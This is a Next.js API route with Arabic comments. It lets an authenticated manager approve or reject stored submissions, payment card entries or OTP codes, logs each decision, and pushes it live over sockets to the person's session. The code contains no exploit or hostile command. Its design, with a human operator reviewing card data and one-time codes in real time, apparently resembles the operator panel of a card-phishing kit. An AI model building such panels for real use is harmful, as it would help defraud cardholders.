import { NextRequest, NextResponse } from 'next/server';
import { getAdminFromRequest } from '@/lib/auth';
import { getAdminClient } from '@/lib/supabase';
import { getIO } from '@/lib/socket';

// قرار المدير (موافقة/رفض) على أحدث إدخال معلّق لكل (مرجع، نوع)
// target_type: 'submission' | 'payment' | 'otp'
// status: 'approved' | 'rejected'
export async function POST(req: NextRequest) {
  const admin = getAdminFromRequest(req);
  if (!admin) {
    return NextResponse.json({ error: 'غير مصرّح' }, { status: 401 });
  }

  try {
    const { target_type, target_id, status, decision_note } = await req.json();
    if (!['submission', 'payment', 'otp'].includes(target_type)) {
      return NextResponse.json({ error: 'نوع هدف غير صالح' }, { status: 400 });
    }
    if (!['approved', 'rejected'].includes(status)) {
      return NextResponse.json({ error: 'حالة غير صالحة' }, { status: 400 });
    }

    const supabase = getAdminClient();
    const tableMap: Record<string, string> = {
      submission: 'submissions',
      payment: 'payment_cards',
      otp: 'otp_codes',
    };
    const table = tableMap[target_type];

    const { data, error } = await supabase
      .from(table)
      .update({
        status,
        manager_id: admin.managerId,
        decision_note,
        decided_at: new Date().toISOString(),
      })
      .eq('id', target_id)
      .select('id,reference,status')
      .single();

    if (error || !data) {
      return NextResponse.json({ error: 'فشل تحديث القرار' }, { status: 500 });
    }

    // تسجيل في سجل التدقيق
    await supabase.from('audit_log').insert({
      manager_id: admin.managerId,
      action: status,
      target_type,
      target_id,
      details: { reference: data.reference, note: decision_note },
    });

    // بثّ القرار للعميل عبر قناة معرّف الإدخال
    const io = getIO();
    if (io) {
      io.to(`entry:${target_id}`).emit('client:decision', {
        entryId: target_id,
        status,
        reference: data.reference,
      });
      // إشعار لوحة الادارة بتحديث الحالة
      io.to('admins').emit('admin:decision_update', { target_type, target_id, status });
    }

    return NextResponse.json({ ok: true, data });
  } catch {
    return NextResponse.json({ error: 'خطأ في الخادم' }, { status: 500 });
  }
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204 });
}
